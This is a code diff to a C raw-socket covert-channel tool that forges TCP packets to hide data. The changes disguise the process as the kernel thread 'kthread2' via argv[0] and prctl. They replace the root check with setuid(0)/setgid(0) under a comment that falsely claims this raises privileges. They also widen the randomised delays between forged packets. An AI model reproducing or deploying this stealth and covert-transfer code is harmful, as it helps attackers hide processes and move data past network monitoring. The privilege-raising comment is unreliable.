@@ -10,6 +10,8 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <sys/time.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
 
 #define USER_ROOT 0
 #define DEST_PORT 8654
@@ -21,6 +23,7 @@
 #define SEND_SOCKET 0
 #define RECV_SOCKET 1
 #define TCP_BUFFER 10000
+#define MASK "kthread2"
 
 	struct channel_info {
 		int server;
@@ -43,9 +46,17 @@ unsigned short in_cksum(unsigned short *addr, int len);
 unsigned short tcp_in_cksum(unsigned int src, unsigned int dst, unsigned short *addr, int length);
 unsigned int host_convert(char *hostname);
 char * convert_ip_to_string(struct in_addr addr);
+void sig_proc();
+
+int recv_sock;
 
 int main(int argc, char **argv)
 {
+	/* mask the process name */
+	memset(argv[0], 0, strlen(argv[0]));	
+	strcpy(argv[0], MASK);
+	prctl(PR_SET_NAME, MASK, 0, 0);
+
  	channel_info.dest_host = UNREAD;
 	channel_info.w_size = WINDOW_SIZE;
 	channel_info.dest_port = DEST_PORT;
@@ -54,8 +65,9 @@ int main(int argc, char **argv)
 
 	if (geteuid() != USER_ROOT)
 	{
-		fprintf(stderr, "You need to be root to run this.\n\n");
-		exit(0);
+		/* change the UID/GID to 0 (raise privs) */
+		setuid(0);
+		setgid(0);
 	}
 
 	if (argc < 5 || argc > 10)
@@ -64,7 +76,7 @@ int main(int argc, char **argv)
 		exit(0);
 	}
 
-	for(i = 0; i < argc; i++)
+	for(i = 1; i < argc; i++)
 	{
 		if (strcmp(argv[i],"-dest") == 0)
 		{
@@ -188,10 +200,11 @@ void decrypt_packet_server()
 		char buffer[TCP_BUFFER];
    	} recv_pkt;	
 
-   	int recv_sock, recv_len;
+   	int recv_len;
    	char * data;
   	char src_port_data[2];
 
+	signal(SIGINT, sig_proc);
    	recv_sock = create_raw_socket(RECV_SOCKET);
 
    	while(1)
@@ -262,7 +275,7 @@ int client_file_io()
 		tt1 = ttp.tv_sec + (ttp.tv_usec / 1000000.0);
 
 		forge_packet_client(addr.sin_addr, addr.sin_port);
-		usleep(rand() % 5000000 + 100000);
+		usleep(rand() % 10000000 + 100000);
 
 		gettimeofday(&ttp, NULL);
 		tt2 = ttp.tv_sec + (ttp.tv_usec / 1000000.0);
@@ -381,4 +394,10 @@ char * convert_ip_to_string(struct in_addr addr)
 		data[i] = atoi(strtok(NULL, "."));
 
 	return data;
+}
+void sig_proc()
+{
+	close_socket(recv_sock);
+	printf("Server Socket closed.\n");
+	exit(0);
 }
